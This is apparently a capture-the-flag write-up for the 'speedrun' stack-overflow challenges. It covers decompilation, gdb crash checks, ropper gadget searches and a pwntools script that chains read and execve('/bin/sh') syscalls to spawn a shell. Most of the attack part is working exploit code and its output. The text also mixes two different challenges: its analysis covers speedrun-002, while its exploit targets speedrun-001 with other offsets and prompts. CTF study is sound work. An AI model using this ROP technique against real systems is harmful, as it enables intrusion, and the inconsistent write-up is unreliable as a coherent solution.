# &#35; speedrun-001

#### &#42; files
```bash
## 2 files
$ ls
libc-2.27.so	speedrun-002

```

#### &#42; execute
```bash
## just echo
$ ./speedrun-002
We meet again on these pwning streets.
What say you now?
AAAAAAAAAAAA
What a ho-hum thing to say.
Fare thee well.

```

#### &#42; debugging
```bash
## can overflow buf[1432]
## iVar1[8] + local_598[400] + local_408[1024]
void FUN_0040074c(void)

{
  int iVar1;
  char local_598 [400];
  undefined local_408 [1024];
  
  puts("What say you now?");
  read(0,local_598,300);
  iVar1 = strncmp(local_598,"Everything intelligent is so boring.",0x24);
  if (iVar1 == 0) {
    FUN_00400705(local_408);
  }
  else {
    puts("What a ho-hum thing to say.");
  }
  return;
}


void FUN_00400705(void *param_1)

{
  puts("What an interesting thing to say.\nTell me more.");
  read(0,param_1,0x7da);
  write(1,"Fascinating.\n",0xd);
  return;
}

```


#### &#42; execute again
```bash
## just echo
$ ./speedrun-002
We meet again on these pwning streets.
What say you now?
Everything intelligent is so boring.
What an interesting thing to say.
Tell me more.
AAAAAAAAAAAAAA
Fascinating.
Fare thee well.

```

#### &#42; structure of stack
```bash
iVar1[8] + local_598[400] + buf[1024] + rbp[8] + ret[8]

```

#### &#42; payload(python)
```bash
payload  = "A"*1432
payload += "B"*8
payload += "C"*8

```

#### &#42; check payload(python)
```bash
$ ulimit -c unlimited
$ (python -c 'print "Everything intelligent is so boring.\n"+"A"*1432+"B"*8+"C"*8')|./speedrun-002
We meet again on these pwning streets.
What say you now?
What an interesting thing to say.
Tell me more.
Fascinating.
Segmentation fault
$ ls core
core
$ gdb -core ./core -q
gef➤  i r $rbp $rip
rbp            0x4242424242424242  0x4242424242424242
rip            0x400bad            0x400bad
gef➤

```


#### &#42; analysis binary using gdb
```bash
## binary have plt/got function
gdb ./speedrun-002 -q
GEF for linux ready, type `gef' to start, `gef config' to configure
94 commands loaded for GDB 9.2 using Python engine 3.8
[*] 2 commands could not be loaded, run `gef missing` to know why.
Reading symbols from ./speedrun-002...
(No debugging symbols found in ./speedrun-002)
gef➤ b *0x0040074c	=> main() address in ghidra decompiler
Breakpoint 1 at 0x40074c
gef➤  r
 →   0x40074c                  push   rbp
     0x40074d                  mov    rbp, rsp
     0x400750                  sub    rsp, 0x590
     0x400757                  lea    rdi, [rip+0x1d0]        # 0x40092e
     0x40075e                  call   0x4005b0 <puts@plt>
     0x400763                  lea    rax, [rbp-0x590]
gef➤  

## find puts_plt/got
gef➤  x/2i 0x4005b0
   0x4005b0 <puts@plt>:	jmp    QWORD PTR [rip+0x200a72]        # 0x601028 <puts@got.plt>
   0x4005b6 <puts@plt+6>:	push   0x2
gef➤  x/2i 0x601028
   0x601028 <puts@got.plt>:	movabs al,ds:0xc600007fbb5c9585
   0x601031 <write@got.plt+1>:	add    eax,0x40
gef➤


## find read_plt/got
gef➤  ni
 →   0x400777                  call   0x4005e0 <read@plt>
   ↳    0x4005e0 <read@plt+0>     jmp    QWORD PTR [rip+0x200a5a]        # 0x601040 <read@got.plt>
        0x4005e6 <read@plt+6>     push   0x5
        0x4005eb <read@plt+11>    jmp    0x400580
        0x4005f0 <setvbuf@plt+0>  jmp    QWORD PTR [rip+0x200a52]        # 0x601048 <setvbuf@got.plt>
        0x4005f6 <setvbuf@plt+6>  push   0x6
        0x4005fb <setvbuf@plt+11> jmp    0x400580
gef➤  x/2i 0x4005e0
   0x4005e0 <read@plt>:	jmp    QWORD PTR [rip+0x200a5a]        # 0x601040 <read@got.plt>
   0x4005e6 <read@plt+6>:	push   0x5
gef➤  x/2i 0x601040
   0x601040 <read@got.plt>:	out    0x5,al
   0x601042 <read@got.plt+2>:	add    BYTE PTR [rax],al
gef➤

## find address is below
## puts_plt : 0x4005b0
## puts_got : 0x601028
## read_plt : 0x4005e0
## read_got : 0x601040



## find gadgets(sys_execve("/bin/sh",0,0)

$ gdb ./speedrun-002 -q
gef➤  ropper --search "pop r?i; ret"
0x00000000004008a3: pop rdi; ret;

gef➤  ropper --search "pop rsi"
0x00000000004008a1: pop rsi; pop r15; ret;

gef➤  ropper --search "pop rdx; ret"
0x00000000004006ec: pop rdx; ret;

gef➤
gef➤  ropper --search "pop r?x; ret"
0x000000000048cccb: pop rax; ret 0x22;
0x0000000000415664: pop rax; ret;
0x00000000004a9a00: pop rbx; ret 0x6f9;
0x0000000000400df8: pop rbx; ret;
0x000000000044be16: pop rdx; ret;


gef➤







=========







gef➤
gef➤  grep "/bin/sh"
[+] Searching '/bin/sh' in memory

## gadgets are below
0x000000000044be16: pop rdx; ret;
0x0000000000415664: pop rax; ret;
0x0000000000400686: pop rdi; ret;
0x00000000004101f3: pop rsi; ret;
0x0000000000474e65: syscall; ret;
```



#### &#42; how to attack
```bash
## binary does not have string("/bin/sh")
## thus we use .bss section like below
## read(0, bss, len("/bin/sh"))
## and send string("/bin/sh")
## execve(&bss, 0, 0)

```


#### &#42; make exploit code
```bash
from pwn import *

context.log_level='debug'

filename = './speedrun-001'
elf=ELF(filename)
conn=process(filename)

binsh='/bin/sh\x00'

bss = elf.get_section_by_name(".bss").header.sh_addr

print(".bss : "+hex(bss))

binsh='/bin/sh\x00'

'''
0x0000000000415664 : pop rax ; ret
0x0000000000400686 : pop rdi ; ret
0x00000000004101f3 : pop rsi ; ret
0x000000000044be16 : pop rdx ; ret
0x0000000000474e65: syscall; ret;
'''
pop_rax=0x0000000000415664
pop_rdi=0x0000000000400686
pop_rsi=0x00000000004101f3
pop_rdx=0x000000000044be16
syscall=0x0000000000474e65

payload  = "A"*1024 + "B"*8
# read(0, bss, len(binsh))
payload += p64(pop_rdi)
payload += p64(0x00)
payload += p64(pop_rsi)
payload += p64(bss)
payload += p64(pop_rdx)
payload += p64(len(binsh))
payload += p64(pop_rax)
payload += p64(0x00)
payload += p64(syscall)

# execve("/bin/sh", 0, 0)
payload += p64(pop_rax)
payload += p64(59)
payload += p64(pop_rdi)
payload += p64(bss)
payload += p64(pop_rsi)
payload += p64(0x0)
payload += p64(pop_rdx)
payload += p64(0x0)
payload += p64(syscall)

conn.recvuntil('Any last words?\n')
conn.send(payload)
conn.send(binsh)

conn.interactive()


```


#### &#42; try to exploit
```bash
$ python exp-speedrun-001.py
[DEBUG] '/pwn/speedrun-2019/speedrun-001' is statically linked, skipping GOT/PLT symbols
[*] '/pwn/speedrun-2019/speedrun-001'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Starting local process './speedrun-001' argv=['./speedrun-001'] : pid 155
.bss : 0x6bb2e0
[DEBUG] Received 0x2b bytes:
    'Hello brave new challenger\n'
    'Any last words?\n'
[DEBUG] Sent 0x498 bytes:
    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    *
    00000400  42 42 42 42  42 42 42 42  86 06 40 00  00 00 00 00  │BBBB│BBBB│··@·│····│
    00000410  00 00 00 00  00 00 00 00  f3 01 41 00  00 00 00 00  │····│····│··A·│····│
    00000420  e0 b2 6b 00  00 00 00 00  16 be 44 00  00 00 00 00  │··k·│····│··D·│····│
    00000430  08 00 00 00  00 00 00 00  64 56 41 00  00 00 00 00  │····│····│dVA·│····│
    00000440  00 00 00 00  00 00 00 00  65 4e 47 00  00 00 00 00  │····│····│eNG·│····│
    00000450  64 56 41 00  00 00 00 00  3b 00 00 00  00 00 00 00  │dVA·│····│;···│····│
    00000460  86 06 40 00  00 00 00 00  e0 b2 6b 00  00 00 00 00  │··@·│····│··k·│····│
    00000470  f3 01 41 00  00 00 00 00  00 00 00 00  00 00 00 00  │··A·│····│····│····│
    00000480  16 be 44 00  00 00 00 00  00 00 00 00  00 00 00 00  │··D·│····│····│····│
    00000490  65 4e 47 00  00 00 00 00                            │eNG·│····│
    00000498
[DEBUG] Sent 0x8 bytes:
    00000000  2f 62 69 6e  2f 73 68 00                            │/bin│/sh·│
    00000008
[*] Switching to interactive mode
[DEBUG] Received 0x436 bytes:
    00000000  54 68 69 73  20 77 69 6c  6c 20 62 65  20 74 68 65  │This│ wil│l be│ the│
    00000010  20 6c 61 73  74 20 74 68  69 6e 67 20  74 68 61 74  │ las│t th│ing │that│
    00000020  20 79 6f 75  20 73 61 79  3a 20 41 41  41 41 41 41  │ you│ say│: AA│AAAA│
    00000030  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    *
    00000420  41 41 41 41  41 41 41 41  41 41 42 42  42 42 42 42  │AAAA│AAAA│AABB│BBBB│
    00000430  42 42 86 06  40 0a                                  │BB··│@·│
    00000436
This will be the last thing that you say: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB\x86\x06
$ cat flag
[DEBUG] Sent 0x9 bytes:
    'cat flag\n'
[DEBUG] Received 0x1b bytes:
    'getted flag successully!!!\n'
getted flag successully!!!
[*] Got EOF while reading in interactive
$
```
